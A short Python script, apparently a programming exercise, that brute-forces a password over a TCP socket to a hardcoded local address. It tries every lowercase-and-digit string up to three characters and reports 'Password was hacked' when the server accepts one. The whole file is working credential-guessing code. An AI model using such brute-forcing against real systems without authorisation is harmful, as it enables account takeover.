import sys
import socket
import itertools
import string

"""Args: Host, port"""

socket_1 = socket.socket()
# address = (sys.argv[1], int(sys.argv[2]))
address = ("192.168.0.102", 9090)

alphabet = list(string.ascii_lowercase)
nums = list(string.digits)
all_char = list(itertools.chain(nums, alphabet))

socket_1.connect(address)
while True:
    for _ in range(1, 4):
        prods = itertools.product(all_char, repeat=_)

        while True:
            try:
                a = next(prods)
            except StopIteration:
                break
            else:
                a = "".join(a)
                socket_1.send(a.encode())
                response = socket_1.recv(1024)
                if response.decode() == "Connection success!":
                    print("Password was hacked:", a)
                    break
        
    break


socket_1.close()